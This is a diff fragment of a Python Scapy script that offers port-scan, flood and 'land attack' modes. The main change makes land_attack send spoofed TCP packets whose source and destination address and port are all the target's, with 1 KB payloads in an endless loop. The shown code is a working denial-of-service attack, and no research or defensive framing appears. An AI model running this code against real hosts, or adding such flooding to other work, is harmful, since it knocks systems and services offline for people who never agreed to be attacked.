@@ -16,8 +16,7 @@ ports = "0"
 target = ""
 
 def main():
-    #configure_ports()
-
+    # configure_ports()
     if scan:
         port_scan()
     elif flood:
@@ -43,7 +42,7 @@ def land_attack():
     # Land attack
     attack_flags = "".join(i for i in flags)
     send(IP(dst=target, src=target, ttl=64)
-         /TCP(sport=RandShort(), flags=attack_flags, dport=int(ports), seq=random.randint(200000000,500000000))
+         /TCP(sport=ports, flags=attack_flags, dport=int(ports), seq=random.randint(200000000,500000000))
          /Raw(b"X"*1024), loop=1, verbose=0)
     print("\n")
 
